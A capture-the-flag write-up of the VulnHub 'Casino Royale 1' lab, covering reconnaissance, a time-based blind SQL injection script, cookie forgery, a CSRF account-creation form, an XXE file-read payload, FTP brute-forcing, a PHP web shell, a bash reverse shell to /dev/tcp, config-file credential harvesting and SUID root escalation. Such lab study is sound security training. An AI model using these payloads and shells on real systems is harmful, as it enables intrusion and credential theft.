---
aliases: []
tags:
  - writeup
  - machine
  - vulnhub
  - linux
  - sqli
  - csrf
  - xxe
  - lfi
  - rce
  - reverse-shell
  - suid
machine: Casino Royale
platform: Linux
difficulty: Intermediate
date: 2026-09-22
techniques:
  - SQL injection
  - CSRF
  - XXE
  - FTP upload to RCE
  - SUID privilege escalation
cve: []
initial vector: Web application with cookie bypass and SQL injection
privilege escalation: SUID binary mi6_detect_test runs bash -p
author: null
source: https://www.vulnhub.com/entry/casino-royale-1,287/
---

- **Casino Royale 1 machine**: [https://www.vulnhub.com/entry/casino-royale-1,287/](https://www.vulnhub.com/entry/casino-royale-1,287/)

## Reconnaissance

### Arp-scan

We scan the network interface to find the machine's IP:
```bash 
arp-scan -I ens33 --localnet
```
### Ping
```
ping -c 1 192.168.18.237
```

### Nmap

We run the command as administrator.
This reveals the open ports.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.237 -oG allPorts
```

Once the ports are found, we run a set of scripts against them. *In this case: 21, 25, 80, 8081*

```bash
nmap -sC -sV -p21,25,80,8081 192.168.18.237 -oN Targgeted
```

Nmap's default scripts normally include *ftp-anon.nse*, and since it gave us no feedback, we can conclude that the *anonymous* user is not available on the FTP service on port 21.

With *ctrl + shift + t* we open another workspace while the scan runs; with *ctrl + shift + alt + t* we name it "scan and recon", and *ctrl + shift + w* closes only the current workspace.

```bash
nmap --script http-enum -p21,25,80,8081 192.168.18.237 -oN webScan 
```
This script behaves like a fuzzer.

### Whatweb
We run the whatweb command to see what the machine is running.
```bash
whatweb http://192.168.1.146 -v
```

Outdated or attack-prone versions should show up. Make sure to document them.

## Exploitation

### Web access via cookie handling
During recon we find an *install/* directory that looks vulnerable; searching in *searchsploit* shows that our version, *0.13*, is in fact vulnerable to a Cookie Handling issue.
```bash
searchsploit -x php/webapps/6766.txt
```

Thanks to the exploit we find a *pokeradmin/* path; we open the browser console with *ctrl + shift + c* and paste the line that sets the admin cookie. We then browse to *pokeradmin/configure.php* and should have full access.
```bash
javascript:document.cookie = "ValidUserAdmin=admin";
```

### SQL injection (time-based)
That already gives us access, but let's open Burp Suite and intercept the request to see if we can change the password.
The login form is vulnerable to SQLi: after injecting *admin' or 1=1-- -* it lets us in, and with *admin' order by 7-- -* we can tell there are 7 columns.
Equality-based checks give us trouble because the page also treats *1=2-- -* as valid, so we build a Python script for a time-based SQLi, using comparisons like the following:
```bash
op=adminlogin&username=admin' and if(substr(database(),1,1)='a',sleep(5),1)-- -&password=admin
```

When building the script we need to add a *Content-Type* header, otherwise the page won't process it.

```python
#!/usr/python3

from pwn import *
import requests, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.18.237/pokeradmin/index.php"
characters = string.ascii_lowercase + string.digits + ":,_-."

def sqli():
    
    data = " "

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for position in range (1, 12):
        for character in characters:

            post_data = {
                'op': 'adminlogin',
                'username': "admin' and if(substr(database(),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
                'password': 'admin'
            }

                
            p1.status(post_data['username'])

            time_start = time.time()
            r = requests.post(main_url, data=post_data, headers=headers)
            time_end = time.time()

            if time_end - time_start > 0.85:

                data += character
                p2.status(data)
                break

    p1.success("Inyeccion SQL completada exitosamente")
    p2.success(data)
    

if __name__=='__main__':
    sqli()
```
With this script we can extract the word *pokerleague*, and with a few small changes we get more information; to enumerate the databases we change lines 32 and 37.
```python
'username': "admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Extracted data: information_schema,mysql,performance_schema,phpmyadmin,pokerleague,vip*

```python
'username': "admin' and if(substr((select group_concat(table_name) from information_schema.table where table_schema='pokerleague'),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Extracted data: pokermax_admin,pokermax_players,pokermax_scores,pokermax_tournaments*

```python
'username': "admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Extracted data: id,username,password,league_name,league_information,league_email,league_tournament_director* — the ones we care about are username and password.

```python
'username': "admin' and if(substr((select group_concat(username,0x3a,password) from pokermax_admin),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Extracted data: admin:raise12million* (this password is not valid over FTP)
Digging through *Manage Players* we find Valenka with a path (http://casino-royale.local/vip-client-portfolios/?uri=blog) that tries to load resources from *casino-royale.local*; to make the images show up we add the machine's IP and the casino-royale.local hostname to /etc/hosts.
Once everything loads we see instructions to send Valenka an email with the subject of a known client.
We connect over telnet to the open port 25 and start testing. There is no email verification at all, so we stand up a Python web server on port 80 and send an email to see if she opens it and reaches back to us.
```bash
telnet 192.168.18.237 25
Trying 192.168.18.237...
Connected to 192.168.18.237.
Escape character is '^]'.
220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
MAIL FROM: test@test.com
250 2.1.0 Ok
RCPT TO: valenka
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: obanno

Esto es una prueba:
http://mi_ip/test.html
.
250 2.0.0 Ok: queued as A65D21D05
```
Within seconds we get a hit on the port-80 server, telling us Valenka opened the email and that we can go ahead and craft a small .html script. On top of that, if we look up the CMS of the new directory (http://casino-royale.local/vip-client-portfolios/?uri=blog) in searchsploit we find an HTML-based Cross-Site Request Forgery (CSRF).

```html
<html>
  <body>
    <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST">
      <input type="hidden" name="emailAddress" value="victor@victor.com" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="victor" />
      <input type="hidden" name="newPassword" value="victor123" />
      <input type="hidden" name="confirmPassword" value="victor123" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>
```
Now we just need to connect again and send her the HTML file.

Once the HTML gives us our own admin user, in the profile of another user called "le" we find another system path that looks vulnerable to an XML attack, which we can tell from a leak in the source code of the new page (http://casino-royale.local//ultra-access-view/main.php).
### XXE to read /etc/passwd
For the XXE we open the PortSwigger site and Burp Suite, intercept the request to the vulnerable endpoint, take the following payload from PortSwigger together with the info leaked in the page source, and paste it into Repeater to read, for example, */etc/passwd*.
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<creds>
 <customer>
	&xxe;
 </customer>
 <password>
	victor123
 </password>
</creds>
```
### FTP brute-force and upload to RCE
Reading the full */etc/passwd* we find an *ftpUserULTRA* that could be useful, but we don't know its password. We can use Hydra and Rockyou to brute-force it, reaching the password *bankbank* at position 48698 in the wordlist.
```bash
hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.18.237 -t 20
```

Once connected over FTP we can upload a .php file to run commands through the cmd parameter.
```php
<?php
  system($_GET['cmd']);
?>
```
The file has to be uploaded as php3, otherwise the FTP server blocks it.
Once uploaded we give it permission 777 and can then control the cmd parameter from the URL.
```
http://casino-royale.local/ultra-access-view/cmd.php3?cmd=whoami
```

### Reverse shell
We start a listener on port 443 from the attacker machine and build a *one-liner* in the URL. Remember to URL-encode the "&" as "%26".
```
http://casino-royale.local/ultra-access-view/cmd.php3?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.18.226/443%200%3E%261%22
```

Once the victim sends us a shell on 443, we upgrade the TTY:
```bash
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bashs
stty rows 44 columns 184

```

## Privilege escalation
On servers like this there are usually config files that store sensitive information, so we use find to locate them and cat every match with a bit of find syntax.
```bash
find -name \*config\* 2>/dev/null -exec cat {} \; | less -S -r
```

In one config file we find a password for the user valenka: *11archives11!*
There is a valenka user we can pivot to thanks to credential reuse.

Finally, we search from the root for files with the SUID bit set.
```bash
find / -perm -4000 2>/dev/null
```
We find this conveniently suspicious file that tries to run a bash script: */opt/casino-royale/mi6_detect_test*
So we go to a temporary directory, create the script and make it executable.
```bash
#!/bin/bash

bash -p
```

Once we are root, we go to the flag directory, which is conveniently a web service, so we spin up a PHP web server on any port to serve the index.php of the flag folder.
```bash
php -S 0.0.0.0:8084
```

![[Pasted image 20260922120359.png|Final flag served with php -S as root]]